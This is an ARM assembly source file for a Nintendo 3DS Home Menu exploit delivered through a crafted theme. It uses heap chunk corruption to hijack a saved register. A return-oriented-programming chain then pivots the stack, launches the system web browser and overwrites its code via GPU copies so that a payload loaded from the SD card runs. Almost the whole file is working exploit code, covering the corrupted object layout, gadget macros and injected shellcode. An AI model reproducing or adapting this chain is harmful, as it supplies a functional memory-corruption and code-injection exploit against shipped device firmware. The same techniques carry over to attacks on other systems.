.arm
.section .init
.global _start

/*
All function addresses referenced here are for v9.4 homemenu.

The memchunkhax(triggered by the buf overflow + memfree) triggers overwriting the saved r4 on the L_22fb34 stackframe, with value=<address of the below object label>. This is the function which called the memfree function.
After calling some func which decreases some counter, homemenu then executes L_1ca5d0(r4), where r4 is the above overwritten ptr.
L_1ca5d0: This first writes u8 value 1 to 0x3b7e. After checking/using other state, this function eventually executes: L_1d1ea8(*(inr0+0x3a60), 1);//where inr0=above ptr
L_1d1ea8: After using other state, it executes: return L_2441a0(*(inr0+0x2f0), inr1);
L_2441a0: L_1e95e0(*(inr0+4)); ...
L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from objectptr> ...//This is where this haxx finally gets control over an objectptr(r0) + PC at the same time.
*/

//The addresses for the ROP-chain is from an include, see the Makefile gcc line with -include / README.

#define TARGETOVERWRITE_STACKADR TARGETOVERWRITE_MEMCHUNKADR+12

#define ROP_BXR1 POP_R4LR_BXR1+4
#define ROP_BXLR ROP_LDR_R0FROMR0+4 //"bx lr"

#if NEW3DS==0
	#define NSS_PROCLOADTEXT_LINEARMEMADR 0x36500000
#else
	#define NSS_PROCLOADTEXT_LINEARMEMADR ((0x3d900000-0x400000)+0x21b000)//In SKATER, overwrite the code which gets called for assert/svcBreak when allocating the main heap fails.
#endif

#ifndef LOADSDPAYLOAD
	#define CODEBINPAYLOAD_SIZE (codedataend-codedatastart)
#else
	#if NEW3DS==0
		#define CODEBINPAYLOAD_SIZE 0x4000
	#else
		#if (REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)//Check for system-version <v9.6.
			#define CODEBINPAYLOAD_SIZE 0x4000
		#else
			#define CODEBINPAYLOAD_SIZE 0x6000
		#endif
	#endif
#endif

.macro ROP_SETLR lr
.word POP_R1PC
.word ROP_POPPC @ r1

.word POP_R4LR_BXR1
.word 0 @ r4
.word \lr
.endm

.macro ROP_SETLR_OTHER lr
.word POP_R2R6PC
.word ROP_POPPC @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word POP_R4R8LR_BXR2
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word \lr
.endm

.macro CALLFUNC funcadr, r0, r1, r2, r3, sp0, sp4, sp8, sp12
ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word \r0

.word POP_R1PC
.word \r1

.word POP_R2R6PC
.word \r2
.word \r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word \funcadr

.word \sp0
.word \sp4
.word \sp8
.word \sp12
.word 0 @ r6
.endm

.macro CALLFUNC_NOSP funcadr, r0, r1, r2, r3
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word \r0

.word POP_R1PC
.word \r1

.word POP_R2R6PC
.word \r2
.word \r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word \funcadr
.endm

.macro CALLFUNC_NOARGS funcadr
ROP_SETLR ROP_POPPC
.word \funcadr
.endm

.macro CALL_GXCMD4 srcadr, dstadr, cpysize
CALLFUNC GXLOW_CMD4, \srcadr, \dstadr, \cpysize, 0, 0, 0, 0, 0x8
.endm

.macro ROPMACRO_STACKPIVOT sp, pc
.word POP_R0PC
.word HEAPBUF + (stackpivot_sploadword - _start) @ r0

.word POP_R1PC
.word \sp @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0

.word POP_R1PC
.word \pc @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0
.endm

.macro PREPARE_RET2MENUCODE
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word TARGETOVERWRITE_STACKADR @ r0

.word POP_R1PC
.word (ORIGINALOBJPTR_BASELOADADR+8) @ r1

.word ROP_LDRR1R1_STRR1R0 @ Restore the saved r4 value overwritten by memchunkhax with the original value.
.endm

.macro RET2MENUCODE
PREPARE_RET2MENUCODE

ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4R5R6PC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
.endm

.macro COND_THROWFATALERR
.word ROP_COND_THROWFATALERR

.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.endm

_start:

themeheader:
#ifndef BUILDROPBIN
@ This is the start of the decompressed theme data.
.word 1 @ version
#else
.word POP_R0PC @ Stack-pivot to ropstackstart.
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0
#endif

.space ((themeheader + 0xc4) - .)

object:
.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
.word HEAPBUF + (object - _start) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
.word 0 @ Memchunk-hdr stuff writes here.
.word 0

.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word HEAPBUF + (ropstackstart - _start) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

.space ((object + 0x28) - .)
.word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.

.space ((object + 0x2ec) - .)
#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && MENUVERSION>12288) //Dunno if this applies for versions other than v9.2.
.word 0 @ The target ptr offset is 0x4-bytes different from v9.2.
#endif
.word HEAPBUF + (object - _start) @ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.

.space ((object + 0x3a60) - .)
#if (REGIONVAL==0 && MENUVERSION<=15360) || (REGIONVAL!=0 && MENUVERSION<=12288) //Dunno if this applies for versions other than v9.2.
.word 0 @ The target ptr offset is 0x4-bytes different from v9.4.
#endif
#if (REGIONVAL==0 && MENUVERSION>=19476) || (REGIONVAL!=0 && MENUVERSION>=16404) //Check for system-version v9.6.
.space 0x40
#endif
.word HEAPBUF + (object - _start) @ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.

vtable:
.word 0, 0 @ vtable+0
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
.word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20

.space ((vtable + 0x100) - .)

.space ((_start + 0x4000) - .) @ Base the stack at heapbuf+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).

tmpdata:

nss_outprocid:
.word 0

#if NEW3DS==0
#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x0
#else
#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x20000000
#endif

nsslaunchtitle_programidlow_list:
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ JPN
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009402 @ USA
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009D02 @ EUR
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ "AUS"(no 3DS systems actually have this region set)
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ CHN (the rest of the IDs here are probably wrong but whatever)
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ KOR
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ TWN

/*nss_servname:
.ascii "ns:s"*/

gamecard_titleinfo:
.word 0, 0 @ programID
.word 2 @ mediatype
.word 0 @ reserved

#ifdef LOADSDPAYLOAD
sd_archivename:
.string "sd:"
.align 2

IFile_ctx:
.space 0x20

#ifndef ENABLE_LOADROPBIN
sdfile_path:
.string16 "sd:/menuhax_payload.bin"
.align 2
#else
sdfile_ropbin_path:
.string16 "sd:/menuhax_ropbinpayload.bin"
.align 2
#endif
#endif

tmp_scratchdata:
.space 0x400

ropstackstart:
#ifdef USE_PADCHECK
PREPARE_RET2MENUCODE

.word POP_R0PC
.word HEAPBUF + (rop_r0data_cmphid - _start) @ r0

.word POP_R1PC
.word 0x1000001c @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to rop_r0data_cmphid, current HID PAD state.

.word POP_R0PC
rop_r0data_cmphid:
.word 0 @ r0

.word POP_R1PC
.word USE_PADCHECK @ r1

.word ROP_CMPR0R1 @ Compare current PAD state with USE_PADCHECK value.

.word HEAPBUF + ((object+0x20) - _start) @ r4

.word POP_R0PC
.word HEAPBUF + (stackpivot_sploadword - _start) @ r0

.word POP_R1PC
.word TARGETOVERWRITE_STACKADR @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0

.word POP_R1PC
.word POP_R4R5R6PC @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the USE_PADCHECK value, continue the ROP, otherwise do the above stack-pivot to return to the home-menu code.

.word 0, 0, 0 @ r4..r6
#endif

//Overwrite the top-screen framebuffers. This doesn't affect the framebuffers when returning from an appet to Home Menu.
CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2

#ifdef ENABLE_RET2MENU//Note that when using this Home Menu will have the default theme "selected", however Home Menu will still load the themehax when homemenu starts up again later.
RET2MENUCODE
#endif

#ifdef ENABLE_LOADROPBIN
#ifndef LOADSDPAYLOAD
CALLFUNC_NOSP MEMCPY, ROPBIN_BUFADR, (HEAPBUF + ((codebinpayload_start) - _start)), (codedataend-codebinpayload_start), 0
#else
CALLFUNC_NOSP FS_MountSdmc, (HEAPBUF + (sd_archivename - _start)), 0, 0, 0
COND_THROWFATALERR

CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_ropbin_path - _start)), 1, 0
COND_THROWFATALERR

CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), ROPBIN_BUFADR, 0x10000
COND_THROWFATALERR

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word (HEAPBUF + (IFile_ctx - _start))

.word ROP_LDR_R0FROMR0

.word IFile_Close
#endif

ROPMACRO_STACKPIVOT ROPBIN_BUFADR, ROP_POPPC
#endif

#ifdef BOOTGAMECARD
#ifdef GAMECARD_PADCHECK
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word 3000000000//0x0 @ r0

.word POP_R1PC
.word 0x0//0x100 @ r1

.word svcSleepThread @ Sleep 3 seconds, otherwise PADCHECK won't work if USE_PADCHECK and GAMECARD_PADCHECK are different values.

.word POP_R0PC
.word HEAPBUF + (rop_r0data_cmphid_gamecard - _start) @ r0

.word POP_R1PC
.word 0x1000001c @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to rop_r0data_cmphid, current HID PAD state.

.word POP_R0PC
rop_r0data_cmphid_gamecard:
.word 0 @ r0

.word POP_R1PC
.word GAMECARD_PADCHECK @ r1

.word ROP_CMPR0R1 @ Compare current PAD state with GAMECARD_PADCHECK value.

.word HEAPBUF + ((object+0x20) - _start) @ r4

.word POP_R0PC
.word HEAPBUF + (stackpivot_sploadword - _start) @ r0

.word POP_R1PC
.word (HEAPBUF + (bootgamecard_ropfinish - _start)) @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0

.word POP_R1PC
.word ROP_POPPC @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the GAMECARD_PADCHECK value, continue the gamecard launch ROP, otherwise do the above stack-pivot to skip gamecard launch.

.word 0, 0, 0 @ r4..r6
#endif

CALLFUNC_NOSP NSS_RebootSystem, 0x1, (HEAPBUF + (gamecard_titleinfo - _start)), 0x0, 0

bootgamecard_ropfinish:
#endif

#if NEW3DS==1 //On New3DS the end-address of the GPU-accessible FCRAM area increased, relative to the SYSTEM-memregion end address. Therefore, in order to get the below process to run under memory that's GPU accessible, 0x400000-bytes are allocated here.
CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0, 0x00400000, 0x3, 0x3, 0, 0
#endif

#ifndef ENABLE_LOADROPBIN
#ifdef LOADSDPAYLOAD//When enabled, load the file from SD to codebinpayload_start.
CALLFUNC_NOSP FS_MountSdmc, (HEAPBUF + (sd_archivename - _start)), 0, 0, 0
COND_THROWFATALERR

CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_path - _start)), 1, 0
COND_THROWFATALERR

CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (codebinpayload_start - _start)), (CODEBINPAYLOAD_SIZE - (codebinpayload_start - codedatastart))
COND_THROWFATALERR

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word (HEAPBUF + (IFile_ctx - _start))

.word ROP_LDR_R0FROMR0

.word IFile_Close
#endif
#endif

CALLFUNC_NOSP GSPGPU_FlushDataCache, (HEAPBUF + (codedatastart - _start)), CODEBINPAYLOAD_SIZE, 0, 0

ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word HEAPBUF + (region_outval - _start) @ r0

.word CFGIPC_SecureInfoGetRegion @ Write the SecureInfo region value to the below field which will be popped into r4.

.word 0 @ r2
.word 0 @ r3
region_outval:
.word 0 @ r4
.word HEAPBUF + (nsslaunchtitle_programidlow_list - _start) @ r5
.word 0 @ r6

.word POP_R0PC
.word HEAPBUF + (object - _start) @ r0

.word ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX //"ldr r1, [r5, r4, lsl #2]" <call vtable funcptr +20 from the r0 object> (load the programID-low for this region into r1)

ROP_SETLR_OTHER ROP_POPPC

.word POP_R0PC

.word HEAPBUF + (nsslaunchtitle_regload_programidlow - _start) @ r0

.word ROP_STR_R1TOR0 //Write the programID-low value for this region to the below reg-data which would be used for the programID-low in the NSS_LaunchTitle call.

ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word HEAPBUF + (nss_outprocid - _start)  @ r0, out procid*

@ r1 isn't used by NSS_LaunchTitle so no need to set it here.

.word POP_R2R6PC
nsslaunchtitle_regload_programidlow:
.word 0 @ r2, programID low (overwritten by the above ROP)
.word 0x00040030 @ r3, programID high
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word NSS_LaunchTitle @ Launch the web-browser.

.word 0 @ r2 / sp0 (mediatype, 0=NAND)
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

#if NEW3DS==1//Use this as a waitbyloop.
CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
#endif

//Overwrite the browser .text with the below code.
CALL_GXCMD4 (HEAPBUF + (codedatastart - _start)), NSS_PROCLOADTEXT_LINEARMEMADR, CODEBINPAYLOAD_SIZE

/*#if NEW3DS==1 //Free the memory which was allocated above on new3ds.
CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0, 0x00400000, 0x1, 0x0, 0, 0
#endif*/

#if NEW3DS==1//Use this as a waitbyloop.
CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
#endif

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word 1000000000//0x0 @ r0

.word POP_R1PC
.word 0x0//0x100 @ r1

.word svcSleepThread @ Sleep 1 second, call GSPGPU_Shutdown() etc, then execute svcSleepThread in an "infinite loop". The ARM11-kernel does not allow this homemenu thread and the browser thread to run at the same time(homemenu thread has priority over the browser thread). Therefore an "infinite loop" like the bx one below will result in execution of the browser thread completely stopping once any homemenu "infinite loop" begin execution. On Old3DS this means the below code will overwrite .text while the browser is attempting to clear .bss. On New3DS since overwriting .text+0 doesn't quite work(context-switching doesn't trigger at the right times), a different location in .text has to be overwritten instead.

CALLFUNC_NOARGS GSPGPU_Shutdown

/*
//Get "ns:s" service handle, then send it via APT_SendParameter(). The codebin payload can then use APT:ReceiveParameter to get this "ns:s" handle.
CALLFUNC_NOSP SRV_GETSERVICEHANDLE, (HEAPBUF + (aptsendparam_handle - _start)), (HEAPBUF + (nss_servname - _start)), 0x4, 0

ROP_SETLR POP_R2R6PC
.word POP_R0PC
.word 0x101 @ r0, dst appID

.word POP_R1PC
.word 0x1 @ r1, signaltype

.word POP_R2R6PC
.word 0 @ r2, parambuf*
.word 0 @ r3, parambufsize
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word APT_SendParameter

aptsendparam_handle:
.word 0 @ sp0, handle
.word 0
.word 0
.word 0
.word 0 @ r6*/

ropfinish_sleepthread:
#ifdef EXITMENU
ROP_SETLR ROP_POPPC

#if NEW3DS==0
.word POP_R0PC
.word 4000000000 @ r0

.word POP_R1PC @ Sleep 4 seconds.
.word 0 @ r1
#else
.word POP_R0PC
.word 3000000000 @ r0

.word POP_R1PC  @ Sleep 3 seconds.
.word 0 @ r1
#endif

.word svcSleepThread

.word 0x00100020 @ LR of main(), svcExitProcess.
#endif

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word 1000000000 @ r0

.word POP_R1PC
.word 0x0 @ r1

.word svcSleepThread

ROPMACRO_STACKPIVOT (HEAPBUF + (ropfinish_sleepthread - _start)), ROP_POPPC

.word POP_R1PC
.word ROP_BXR1 @ r1

.word ROP_BXR1 @ This is used as an infinite loop.

.word 0x58584148

.align 4
codedatastart:
#if NEW3DS==0
.space 0x200 @ nop-sled
#else
#if (REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)
.space 0x1000
#else
.space 0x3000 @ Size >=0x2000 is needed for SKATER >=v9.6(0x3000 for SKATER system-version v9.9), but doesn't work with the initial version of SKATER for whatever reason.
#endif
#endif

#if NEW3DS==0
ldr r0, =3000000000
mov r1, #0
svc 0x0a @ Sleep 3 seconds.
#else
/*ldr r0, =3000000000
mov r1, #0
svc 0x0a @ Sleep 3 seconds.*/
/*ldr r0, =0x540BE400
mov r1, #2
svc 0x0a @ Sleep 10 seconds, so that hopefully the payload doesn't interfere with sysmodule loading.*/
#endif

ldr r0, =0x10003 @ operation
mov r4, #3 @ permissions

mov r1, #0 @ addr0
mov r2, #0 @ addr1
ldr r3, =0xc000 @ size
svc 0x01 @ Allocate 0xc000-bytes of linearmem.
mov r4, r1
cmp r0, #0
bne codecrash

mov r1, #0x49
str r1, [r4, #0x48] @ flags
ldr r1, =0x101
str r1, [r4, #0x5c] @ NS appID (use the homemenu appID since the browser appID wouldn't be registered yet)
mov r0, r4
adr r1, codecrash
mov lr, r1
#ifdef PAYLOADENABLED
b codebinpayload_start
#else
b codecrash
#endif
.pool

codecrash:
ldr r3, =0x58584148
ldr r3, [r3]
code_end:
b code_end
.pool

.align 4
codebinpayload_start:
#ifdef CODEBINPAYLOAD
.incbin CODEBINPAYLOAD
#endif

.align 4
codedataend:
.word 0

